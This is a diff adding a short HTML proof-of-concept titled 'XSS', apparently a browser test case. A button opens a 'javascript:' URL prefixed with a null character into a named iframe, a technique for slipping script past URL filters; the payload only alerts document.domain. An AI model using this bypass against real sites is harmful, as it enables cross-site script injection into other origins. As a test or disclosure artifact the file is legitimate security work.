@@ -1,0 +1,7 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>XSS</title>
+   
+   </head><body><iframe name="test" src="./XSS_files/saved_resource.html"></iframe>
+   
+   <input type="button" value="test" onclick="window.open('\u0000javascript:alert(document.domain)','test')">
+   
+</body></html>
